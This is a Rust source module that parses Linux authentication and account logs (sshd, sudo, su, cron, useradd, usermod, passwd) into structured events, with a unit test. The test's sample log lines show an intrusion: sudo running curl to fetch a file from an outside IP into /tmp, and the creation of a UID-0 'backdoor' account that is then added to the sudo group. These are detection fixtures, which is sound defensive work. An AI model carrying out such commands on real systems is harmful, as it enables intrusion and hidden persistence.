//! What authentication and account programs recorded: sshd's logins,
//! failures and connections, sudo's commands, su, cron's jobs, and the
//! account tools (`useradd`, `userdel`, `usermod`, `groupadd`, `passwd`,
//! `chpasswd`). Messages these patterns don't cover stay plain entries.

use crate::{address, Entry};

/// What an entry records.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Event {
    /// `ssh login`, `ssh failed login`, `ssh invalid user`, `ssh connection`,
    /// `ssh disconnect`, `sudo`, `su`, `cron command`, `session opened`,
    /// `user added`, `user deleted`, `user changed`, `group added`,
    /// `password changed`.
    pub action: &'static str,
    /// The account acted as (the one logging in, running sudo, …).
    pub user: Option<String>,
    /// The account acted on (sudo's target, the account created, …).
    pub target_user: Option<String>,
    /// Where it came from.
    pub source_ip: Option<String>,
    /// The source port.
    pub port: Option<u16>,
    /// `password`, `publickey`, `keyboard-interactive/pam`, …
    pub method: Option<String>,
    /// The key's fingerprint (`RSA SHA256:…`).
    pub fingerprint: Option<String>,
    /// For a failed login: the account doesn't exist.
    pub invalid_user: bool,
    /// The command run (sudo, cron).
    pub command: Option<String>,
    /// The group (account tools).
    pub group: Option<String>,
}

impl Event {
    fn new(action: &'static str) -> Self {
        Self {
            action,
            user: None,
            target_user: None,
            source_ip: None,
            port: None,
            method: None,
            fingerprint: None,
            invalid_user: false,
            command: None,
            group: None,
        }
    }
}

/// What `entry` records, when its program and message say.
#[must_use]
pub fn classify(entry: &Entry) -> Option<Event> {
    let program = entry.program.as_deref()?;
    let message = entry.message.trim();
    let name = program.rsplit('/').next().unwrap_or(program);
    match name {
        "sshd" | "sshd-session" => sshd(message),
        "sudo" => sudo(message),
        "su" => su(message),
        "CRON" | "cron" | "crond" => cron(message),
        "useradd" | "userdel" | "usermod" | "groupadd" | "passwd" | "chpasswd" => {
            account(name, message)
        }
        _ => pam_session(message),
    }
}

/// `… from <address> port <n>…`: the address and the port.
fn from_port(text: &str) -> (Option<String>, Option<u16>, &str) {
    let Some(at) = text.find(" from ") else {
        return (None, None, text);
    };
    let after = &text[at + 6..];
    let (ip, rest) = after.split_once(' ').unwrap_or((after, ""));
    let port_rest = rest.strip_prefix("port ").unwrap_or("");
    let digits: String = port_rest.chars().take_while(char::is_ascii_digit).collect();
    let rest = port_rest[digits.len()..].trim_start();
    (address(ip), digits.parse().ok(), rest)
}

fn sshd(message: &str) -> Option<Event> {
    // Accepted <method> for <user> from <ip> port <n> ssh2[: <key> <fingerprint>]
    for (prefix, action) in [("Accepted ", "ssh login"), ("Failed ", "ssh failed login")] {
        if let Some(rest) = message.strip_prefix(prefix) {
            let (method, rest) = rest.split_once(" for ")?;
            let (invalid, rest) = rest
                .strip_prefix("invalid user ")
                .map_or((false, rest), |r| (true, r));
            let at = rest.find(" from ")?;
            let mut event = Event::new(action);
            event.user = Some(rest[..at].to_owned());
            event.method = Some(method.to_owned());
            event.invalid_user = invalid;
            let (ip, port, tail) = from_port(rest);
            event.source_ip = ip;
            event.port = port;
            event.fingerprint = tail
                .split_once(": ")
                .map(|(_, key)| key.trim().to_owned())
                .filter(|k| !k.is_empty());
            return Some(event);
        }
    }
    if let Some(rest) = message.strip_prefix("Invalid user ") {
        let mut event = Event::new("ssh invalid user");
        let at = rest.find(" from ")?;
        event.user = Some(rest[..at].to_owned());
        (event.source_ip, event.port, _) = from_port(rest);
        return Some(event);
    }
    if message.starts_with("Connection from ") {
        let mut event = Event::new("ssh connection");
        (event.source_ip, event.port, _) = from_port(&format!(" {message}"));
        return Some(event);
    }
    if let Some(rest) = message.strip_prefix("Disconnected from user ") {
        let mut event = Event::new("ssh disconnect");
        let (user, rest) = rest.split_once(' ')?;
        event.user = Some(user.to_owned());
        (event.source_ip, event.port, _) = from_port(&format!(" from {rest}"));
        return Some(event);
    }
    pam_session(message)
}

/// `<user> : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/bash`.
fn sudo(message: &str) -> Option<Event> {
    let (user, rest) = message.split_once(" : ")?;
    let mut event = Event::new("sudo");
    event.user = Some(user.trim().to_owned());
    for part in rest.split(" ; ") {
        if let Some(target) = part.strip_prefix("USER=") {
            event.target_user = Some(target.to_owned());
        } else if let Some(command) = part.strip_prefix("COMMAND=") {
            event.command = Some(command.to_owned());
        }
    }
    event
        .command
        .is_some()
        .then_some(event)
        .or_else(|| pam_session(message))
}

/// `(to root) alice on pts/0`, `Successful su for root by alice`.
fn su(message: &str) -> Option<Event> {
    if let Some(rest) = message.strip_prefix("(to ") {
        let (target, rest) = rest.split_once(") ")?;
        let mut event = Event::new("su");
        event.target_user = Some(target.to_owned());
        event.user = rest.split(' ').next().map(str::to_owned);
        return Some(event);
    }
    if let Some(rest) = message.strip_prefix("Successful su for ") {
        let (target, user) = rest.split_once(" by ")?;
        let mut event = Event::new("su");
        event.target_user = Some(target.to_owned());
        event.user = Some(user.to_owned());
        return Some(event);
    }
    pam_session(message)
}

/// `(root) CMD (touch /tmp/afile.txt)`.
fn cron(message: &str) -> Option<Event> {
    let rest = message.strip_prefix('(')?;
    let (user, rest) = rest.split_once(") CMD (")?;
    let mut event = Event::new("cron command");
    event.user = Some(user.to_owned());
    event.command = Some(rest.strip_suffix(')').unwrap_or(rest).to_owned());
    Some(event)
}

/// `pam_unix(sshd:session): session opened for user alice(uid=1000) by (uid=0)`.
fn pam_session(message: &str) -> Option<Event> {
    let at = message.find("session opened for user ")?;
    let rest = &message[at + "session opened for user ".len()..];
    let user: String = rest
        .chars()
        .take_while(|c| !c.is_whitespace() && *c != '(')
        .collect();
    let mut event = Event::new("session opened");
    event.user = Some(user);
    Some(event)
}

/// The account tools' messages.
fn account(program: &str, message: &str) -> Option<Event> {
    // useradd: `new user: name=bob, UID=1001, GID=1001, home=/home/bob, …`
    // groupadd: `new group: name=ops, GID=1002`
    let value = |key: &str| {
        message
            .split([',', ' '])
            .find_map(|part| part.strip_prefix(key))
            .map(|v| v.trim_matches(['\'', '"']).to_owned())
    };
    let quoted = |text: &str| text.split('\'').nth(1).map(str::to_owned);
    match program {
        "useradd" if message.starts_with("new user:") => {
            let mut event = Event::new("user added");
            event.target_user = value("name=");
            Some(event)
        }
        "groupadd" if message.starts_with("new group:") => {
            let mut event = Event::new("group added");
            event.group = value("name=");
            Some(event)
        }
        // userdel: `delete user 'bob'`
        "userdel" if message.starts_with("delete user") => {
            let mut event = Event::new("user deleted");
            event.target_user = quoted(message);
            Some(event)
        }
        // usermod: `add 'bob' to group 'sudo'`
        "usermod" if message.starts_with("add '") => {
            let mut event = Event::new("user changed");
            let mut parts = message.split('\'');
            event.target_user = parts.nth(1).map(str::to_owned);
            event.group = parts.nth(1).map(str::to_owned);
            Some(event)
        }
        // passwd: `pam_unix(passwd:chauthtok): password changed for bob`
        "passwd" | "chpasswd" => {
            let at = message.find("password changed for ")?;
            let mut event = Event::new("password changed");
            event.target_user = Some(
                message[at + "password changed for ".len()..]
                    .trim()
                    .to_owned(),
            );
            Some(event)
        }
        _ => None,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::{parse, Context};

    fn event(line: &str) -> Option<Event> {
        classify(&parse(line.as_bytes(), Context::default()).entries[0])
    }

    #[test]
    fn sudo_su_and_accounts() {
        let sudo = event("Oct  3 10:00:00 web1 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/curl -o /tmp/x http://203.0.113.9/x").unwrap();
        assert_eq!(
            (
                sudo.action,
                sudo.user.as_deref(),
                sudo.target_user.as_deref()
            ),
            ("sudo", Some("alice"), Some("root"))
        );
        assert_eq!(
            sudo.command.as_deref(),
            Some("/usr/bin/curl -o /tmp/x http://203.0.113.9/x")
        );
        let su = event("Oct  3 10:00:01 web1 su[812]: (to root) alice on pts/0").unwrap();
        assert_eq!(
            (su.action, su.user.as_deref(), su.target_user.as_deref()),
            ("su", Some("alice"), Some("root"))
        );
        let added = event("Oct  3 10:00:02 web1 useradd[900]: new user: name=backdoor, UID=0, GID=0, home=/root, shell=/bin/bash, from=/dev/pts/0").unwrap();
        assert_eq!(
            (added.action, added.target_user.as_deref()),
            ("user added", Some("backdoor"))
        );
        let changed =
            event("Oct  3 10:00:03 web1 usermod[901]: add 'backdoor' to group 'sudo'").unwrap();
        assert_eq!(
            (changed.target_user.as_deref(), changed.group.as_deref()),
            (Some("backdoor"), Some("sudo"))
        );
        let deleted = event("Oct  3 10:00:04 web1 userdel[902]: delete user 'backdoor'").unwrap();
        assert_eq!(
            (deleted.action, deleted.target_user.as_deref()),
            ("user deleted", Some("backdoor"))
        );
        let password = event("Oct  3 10:00:05 web1 passwd[903]: pam_unix(passwd:chauthtok): password changed for root").unwrap();
        assert_eq!(
            (password.action, password.target_user.as_deref()),
            ("password changed", Some("root"))
        );
        let session = event("Oct  3 10:00:06 web1 sshd[904]: pam_unix(sshd:session): session opened for user alice(uid=1000) by (uid=0)").unwrap();
        assert_eq!(
            (session.action, session.user.as_deref()),
            ("session opened", Some("alice"))
        );
        let invalid = event(
            "Oct  3 10:00:07 web1 sshd[905]: Invalid user oracle from 198.51.100.4 port 51234",
        )
        .unwrap();
        assert_eq!(
            (
                invalid.action,
                invalid.user.as_deref(),
                invalid.source_ip.as_deref()
            ),
            ("ssh invalid user", Some("oracle"), Some("198.51.100.4"))
        );
        assert_eq!(
            event("Oct  3 10:00:08 web1 systemd[1]: Started Session 4 of user alice."),
            None
        );
    }
}
